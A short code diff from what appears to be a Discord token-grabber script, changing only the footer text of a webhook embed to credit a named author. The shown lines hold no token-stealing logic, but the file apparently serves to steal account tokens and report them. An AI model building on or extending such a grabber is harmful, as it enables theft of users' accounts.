@@ -164,7 +164,7 @@ def main():
                     "icon_url": avatar_url
                 },
                 "footer": {
-                    "text": f"Token grabber by {developer}"
+                    "text": f"Token grabber by social.#0069"
                 }
             }
             embeds.append(embed)
